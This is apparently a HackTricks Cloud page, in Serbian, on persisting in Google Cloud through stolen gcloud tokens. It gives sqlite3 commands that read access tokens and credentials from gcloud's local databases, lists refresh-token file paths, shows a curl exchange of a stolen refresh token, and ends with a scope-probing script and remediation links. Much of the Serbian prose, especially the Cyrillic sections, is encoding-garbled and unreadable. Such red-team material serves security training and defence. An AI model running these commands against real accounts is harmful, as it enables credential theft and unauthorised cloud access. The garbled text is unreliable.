# GCP - Non-svc Persistance

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Ovo su korisne tehnike kada, na neki naƒçin, kompromitujete neke GCP akreditive ili ma≈°inu koja radi u GCP okru≈æenju.

## Token Hijacking

### Autentifikovani korisniƒçki tokeni

Da biste dobili **trenutni token** korisnika, mo≈æete pokrenuti:

{% code overflow="wrap" %}
```bash
sqlite3 $HOME/.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
{% endcode %}

Proverite na ovoj stranici kako da **direktno koristite ovaj token koristeƒái gcloud**:

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#id-6440-1" %}

Da biste dobili detalje za **generisanje novog pristupnog tokena**, pokrenite:

{% code overflow="wrap" %}
```bash
sqlite3 $HOME/.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
{% endcode %}

Takoƒëe je moguƒáe pronaƒái refresh tokene u **`$HOME/.config/gcloud/application_default_credentials.json`** i u **`$HOME/.config/gcloud/legacy_credentials/*/adc.json`**.

Da biste dobili novi osve≈æeni pristupni token sa **refresh tokenom**, ID-jem klijenta i tajnom klijenta, pokrenite:

{% code overflow="wrap" %}
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
{% endcode %}

Va≈æenje refresh tokena mo≈æe se upravljati u **Admin** > **Security** > **Google Cloud session control**, a prema zadanim postavkama postavljeno je na 16h, iako se mo≈æe postaviti da nikada ne istekne:

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### Auth flow

Tok autentifikacije kada se koristi ne≈°to poput `gcloud auth login` otvorit ƒáe prompt u pregledniku, a nakon prihvaƒáanja svih opsega preglednik ƒáe poslati zahtev poput ovog na http port otvoren od strane alata:
```
/?state=EN5AK1GxwrEKgKog9ANBm0qDwWByYO&code=4/0AeaYSHCllDzZCAt2IlNWjMHqr4XKOuNuhOL-TM541gv-F6WOUsbwXiUgMYvo4Fg0NGzV9A&scope=email%20openid%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/cloud-platform%20https://www.googleapis.com/auth/appengine.admin%20https://www.googleapis.com/auth/sqlservice.login%20https://www.googleapis.com/auth/compute%20https://www.googleapis.com/auth/accounts.reauth&authuser=0&prompt=consent HTTP/1.1
```
Zatim, gcloud ƒáe koristiti stanje i kod sa nekim hardkodiranim `client_id` (`32555940559.apps.googleusercontent.com`) i **`client_secret`** (`ZmssLNjJy2998hD4CTg2ejr2`) da dobije **konaƒçne podatke o refresh tokenu**.

{% hint style="danger" %}
Napomena da je komunikacija sa localhost-om u HTTP-u, tako da je moguƒáe presresti podatke da bi se dobio refresh token, meƒëutim, ovi podaci su validni samo 1 put, tako da bi to bilo beskorisno, lak≈°e je jednostavno proƒçitati refresh token iz datoteke.
{% endhint %}

### OAuth Scopes

Mo≈æete pronaƒái sve Google scope-ove na [https://developers.google.com/identity/protocols/oauth2/scopes](https://developers.google.com/identity/protocols/oauth2/scopes) ili ih dobiti izvr≈°avanjem:

{% code overflow="wrap" %}
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-A/\-\._]*' | sort -u
```
{% endcode %}

Moguƒáe je videti koje opsege aplikacija koja **`gcloud`** koristi za autentifikaciju mo≈æe podr≈æati pomoƒáu ovog skripta:
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope         \r"
if ! curl -v "https://accounts.google.com/o/oauth2/auth?response_type=code&client_id=32555940559.apps.googleusercontent.com&redirect_uri=http%3A%2F%2Flocalhost%3A8085%2F&scope=openid+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcloud-platform+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fappengine.admin+$scope+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fsqlservice.login+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcompute+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Faccounts.reauth&state=AjvFqBW5XNIw3VADagy5pvUSPraLQu&access_type=offline&code_challenge=IOk5F08WLn5xYPGRAHP9CTGHbLFDUElsP551ni2leN4&code_challenge_method=S256" 2>&1 | grep -q "error"; then
echo ""
echo $scope
fi
done
```
–ü–æ—Å–ª–µ –∏–∑–≤—Ä—à–∞–≤–∞—ö–∞, –ø—Ä–æ–≤–µ—Ä–µ–Ω–æ —ò–µ –¥–∞ –æ–≤–∞ –∞–ø–ª–∏–∫–∞—Ü–∏—ò–∞ –ø–æ–¥—Ä–∂–∞–≤–∞ –æ–≤–µ –æ–ø—Å–µ–≥–µ:
```
https://www.googleapis.com/auth/appengine.admin
https://www.googleapis.com/auth/bigquery
https://www.googleapis.com/auth/cloud-platform
https://www.googleapis.com/auth/compute
https://www.googleapis.com/auth/devstorage.full_control
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/userinfo.email
```
–∏–Ω—Ç–µ—Ä–µ—Å–∞–Ω—Ç–Ω–æ —ò–µ –≤–∏–¥–µ—Ç–∏ –∫–∞–∫–æ –æ–≤–∞ –∞–ø–ª–∏–∫–∞—Ü–∏—ò–∞ –ø–æ–¥—Ä–∂–∞–≤–∞ **`drive`** –æ–ø—Å–µ–≥, –∫–æ—ò–∏ –±–∏ –º–æ–≥–∞–æ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –∫–æ—Ä–∏—Å–Ω–∏–∫—É –¥–∞ –µ—Å–∫–∞–ª–∏—Ä–∞ –∏–∑ GCP —É Workspace –∞–∫–æ –Ω–∞–ø–∞–¥–∞—á —É—Å–ø–µ –¥–∞ –Ω–∞—Ç–µ—Ä–∞ –∫–æ—Ä–∏—Å–Ω–∏–∫–∞ –¥–∞ –≥–µ–Ω–µ—Ä–∏—à–µ —Ç–æ–∫–µ–Ω —Å–∞ –æ–≤–∏–º –æ–ø—Å–µ–≥–æ–º.

**–ü—Ä–æ–≤–µ—Ä–∏—Ç–µ –∫–∞–∫–æ –¥–∞** [**–∑–ª–æ—É–ø–æ—Ç—Ä–µ–±–∏—Ç–µ –æ–≤–æ –æ–≤–¥–µ**](../gcp-to-workspace-pivoting/#abusing-gcloud)**.**

### –°–µ—Ä–≤–∏—Å–Ω–∏ –Ω–∞–ª–æ–∑–∏

–ë–∞—à –∫–∞–æ –∏ –∫–æ–¥ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–æ–≤–∞–Ω–∏—Ö –∫–æ—Ä–∏—Å–Ω–∏–∫–∞, –∞–∫–æ —É—Å–ø–µ—Ç–µ –¥–∞ **–∫–æ–º–ø—Ä–æ–º–∏—Ç—É—ò–µ—Ç–µ –ø—Ä–∏–≤–∞—Ç–Ω–∏ –∫—ô—É—á** —Å–µ—Ä–≤–∏—Å–Ω–æ–≥ –Ω–∞–ª–æ–≥–∞, –º–æ—õ–∏ —õ–µ—Ç–µ –¥–∞ **–ø—Ä–∏—Å—Ç—É–ø–∏—Ç–µ —Ç–æ–º –Ω–∞–ª–æ–≥—É –æ–±–∏—á–Ω–æ –∫–æ–ª–∏–∫–æ –≥–æ–¥ –∂–µ–ª–∏—Ç–µ**.\
–ú–µ—í—É—Ç–∏–º, –∞–∫–æ —É–∫—Ä–∞–¥–µ—Ç–µ **OAuth —Ç–æ–∫–µ–Ω** —Å–µ—Ä–≤–∏—Å–Ω–æ–≥ –Ω–∞–ª–æ–≥–∞, —Ç–æ –º–æ–∂–µ –±–∏—Ç–∏ —ò–æ—à –∏–Ω—Ç–µ—Ä–µ—Å–∞–Ω—Ç–Ω–∏—ò–µ, —ò–µ—Ä, –∏–∞–∫–æ —Å—É –æ–≤–∏ —Ç–æ–∫–µ–Ω–∏ –ø–æ –ø–æ–¥—Ä–∞–∑—É–º–µ–≤–∞–Ω–æ—ò –≤—Ä–µ–¥–Ω–æ—Å—Ç–∏ –∫–æ—Ä–∏—Å–Ω–∏ —Å–∞–º–æ —Å–∞—Ç –≤—Ä–µ–º–µ–Ω–∞, –∞–∫–æ **–∂—Ä—Ç–≤–∞ –æ–±—Ä–∏—à–µ –ø—Ä–∏–≤–∞—Ç–Ω–∏ API –∫—ô—É—á, OAuth —Ç–æ–∫–µ–Ω —õ–µ –∏ –¥–∞—ô–µ –±–∏—Ç–∏ –≤–∞–∂–µ—õ–∏ –¥–æ –∏—Å—Ç–µ–∫–∞**.

### –ú–µ—Ç–∞ –ø–æ–¥–∞—Ü–∏

–û—á–∏–≥–ª–µ–¥–Ω–æ, —Å–≤–µ –¥–æ–∫ —Å—Ç–µ —É–Ω—É—Ç–∞—Ä –º–∞—à–∏–Ω–µ –∫–æ—ò–∞ —Ä–∞–¥–∏ —É GCP –æ–∫—Ä—É–∂–µ—ö—É, –º–æ—õ–∏ —õ–µ—Ç–µ –¥–∞ **–ø—Ä–∏—Å—Ç—É–ø–∏—Ç–µ —Å–µ—Ä–≤–∏—Å–Ω–æ–º –Ω–∞–ª–æ–≥—É –ø–æ–≤–µ–∑–∞–Ω–æ–º —Å–∞ —Ç–æ–º –º–∞—à–∏–Ω–æ–º –∫–æ–Ω—Ç–∞–∫—Ç–∏—Ä–∞—ò—É—õ–∏ –º–µ—Ç–∞ –ø–æ–¥–∞—Ç–∫–µ** (–∏–º–∞—ò—Ç–µ –Ω–∞ —É–º—É –¥–∞ —Å—É OAuth —Ç–æ–∫–µ–Ω–∏ –∫–æ—ò–∏–º–∞ –º–æ–∂–µ—Ç–µ –ø—Ä–∏—Å—Ç—É–ø–∏—Ç–∏ –Ω–∞ –æ–≤–æ–º –∫—Ä–∞—ò—É –æ–±–∏—á–Ω–æ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏ –æ–ø—Å–µ–≥–æ–º).

### –†–µ–º–µ–¥–∏—ò–∞—Ü–∏—ò–µ

–ù–µ–∫–æ–ª–∏–∫–æ —Ä–µ–º–µ–¥–∏—ò–∞—Ü–∏—ò–∞ –∑–∞ –æ–≤–µ —Ç–µ—Ö–Ω–∏–∫–µ –æ–±—ò–∞—à—ö–µ–Ω–æ —ò–µ –Ω–∞ [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

## –†–µ—Ñ–µ—Ä–µ–Ω—Ü–µ

* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
